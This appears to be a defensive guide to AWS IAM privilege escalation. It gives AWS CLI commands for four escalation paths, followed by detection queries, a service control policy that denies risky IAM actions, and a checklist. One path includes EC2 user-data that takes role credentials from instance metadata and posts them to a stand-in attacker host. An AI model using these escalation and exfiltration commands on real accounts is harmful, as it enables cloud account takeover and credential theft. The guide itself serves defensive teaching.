# IAM Privilege Escalation

## The Problem

Certain IAM permissions, when granted carelessly, allow an attacker to escalate their own privileges to admin — even from a low-privilege starting point.

---

## Common Escalation Paths

### Path 1 — `iam:AttachRolePolicy`
```bash
# Attacker has a role with iam:AttachRolePolicy permission
# They attach AdministratorAccess to their own role

aws iam attach-role-policy \
  --role-name AttackerRole \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Now AttackerRole has full admin access
```

### Path 2 — `iam:CreatePolicyVersion`
```bash
# Attacker creates a new version of an existing policy with * permissions
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789:policy/MyPolicy \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
  }' \
  --set-as-default
# Policy now grants everything
```

### Path 3 — `iam:PassRole` + `ec2:RunInstances`
```bash
# Attacker launches a new EC2 with an admin role attached
aws ec2 run-instances \
  --image-id ami-12345678 \
  --instance-type t3.micro \
  --iam-instance-profile Name=AdminInstanceProfile \
  --user-data '#!/bin/bash
    curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole \
    | curl -X POST -d @- https://attacker.com/steal'
# EC2 starts, sends admin credentials to attacker's server
```

### Path 4 — `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction`
```bash
# Create a Lambda with an admin execution role
aws lambda create-function \
  --function-name backdoor \
  --runtime python3.11 \
  --role arn:aws:iam::123456789:role/AdminRole \
  --handler index.handler \
  --zip-file fileb://backdoor.zip

# Invoke it — Lambda runs as admin role
aws lambda invoke --function-name backdoor output.json
```

---

## Detection

```bash
# 1. Find all users/roles with dangerous IAM permissions
DANGEROUS_ACTIONS=(
  "iam:AttachRolePolicy"
  "iam:CreatePolicyVersion"
  "iam:PassRole"
  "iam:PutRolePolicy"
  "iam:UpdateAssumeRolePolicy"
  "sts:AssumeRole"
)

# Check policies attached to a user for these actions
aws iam list-attached-user-policies --user-name target-user
aws iam list-user-policies --user-name target-user

# 2. Run IAM Access Analyzer to find privilege escalation risks
aws accessanalyzer create-analyzer \
  --analyzer-name my-analyzer \
  --type ACCOUNT

aws accessanalyzer list-findings \
  --analyzer-name my-analyzer \
  --query 'findings[?status==`ACTIVE`].[id,resourceType,condition]' \
  --output table

# 3. Detect policy changes in CloudTrail
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AttachRolePolicy \
  --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \
  --query 'Events[*].[EventTime,Username,CloudTrailEvent]' \
  --output table

# Check for other high-risk events
for event in PutRolePolicy CreatePolicyVersion UpdateAssumeRolePolicy AddUserToGroup; do
  echo "=== Checking $event ==="
  aws cloudtrail lookup-events \
    --lookup-attributes AttributeKey=EventName,AttributeValue=$event \
    --start-time $(date -u -d '24 hours ago' +%Y-%m-%dT%H:%M:%SZ) \
    --query 'Events[*].[EventTime,Username]' \
    --output table
done
```

---

## Prevention

### 1. Never Grant Broad IAM Permissions — Scope Tightly
```bash
# Bad — allows attaching any policy to any role
{
  "Effect": "Allow",
  "Action": "iam:AttachRolePolicy",
  "Resource": "*"
}

# Good — restrict to specific roles and specific policies only
{
  "Effect": "Allow",
  "Action": "iam:AttachRolePolicy",
  "Resource": "arn:aws:iam::123456789:role/specific-role",
  "Condition": {
    "ArnEquals": {
      "iam:PolicyARN": "arn:aws:iam::123456789:policy/allowed-policy"
    }
  }
}
```

### 2. SCP — Deny Dangerous IAM Actions Org-Wide
```bash
aws organizations create-policy \
  --name BlockPrivEscalation \
  --type SERVICE_CONTROL_POLICY \
  --description "Block IAM privilege escalation paths" \
  --content '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Deny",
      "Action": [
        "iam:CreatePolicyVersion",
        "iam:SetDefaultPolicyVersion",
        "iam:AttachRolePolicy",
        "iam:PutRolePolicy",
        "iam:UpdateAssumeRolePolicy"
      ],
      "Resource": "*",
      "Condition": {
        "StringNotLike": {
          "aws:PrincipalArn": "arn:aws:iam::*:role/SecurityAdminRole"
        }
      }
    }]
  }'
```

### 3. Enable GuardDuty — Detects Privilege Escalation Attempts
```bash
# Enable GuardDuty in all regions
aws guardduty create-detector --enable --finding-publishing-frequency FIFTEEN_MINUTES

# GuardDuty automatically detects:
# - Policy:IAMUser/RootCredentialUsage
# - PrivilegeEscalation:IAMUser/AdministrativePermissions
# - Persistence:IAMUser/UserPermissions
```

---

## High-Risk Permissions Reference

| Permission | Escalation Method |
|---|---|
| `iam:AttachRolePolicy` | Attach AdministratorAccess to own role |
| `iam:CreatePolicyVersion` | Overwrite existing policy with `*:*` |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `iam:PassRole` + `lambda:CreateFunction` | Deploy Lambda with admin role |
| `iam:CreateAccessKey` | Create keys for another admin user |
| `iam:UpdateLoginProfile` | Reset another user's console password |
| `sts:AssumeRole` on `*` | Assume any role in the account |

---

## Checklist

- [ ] No user or role has `iam:*` or `*:*` unless absolutely necessary
- [ ] `iam:PassRole` is scoped to specific roles only
- [ ] SCPs block privilege escalation actions org-wide
- [ ] IAM Access Analyzer enabled and findings reviewed weekly
- [ ] CloudWatch alarms on `AttachRolePolicy`, `CreatePolicyVersion`, `PutRolePolicy`
- [ ] GuardDuty enabled across all regions
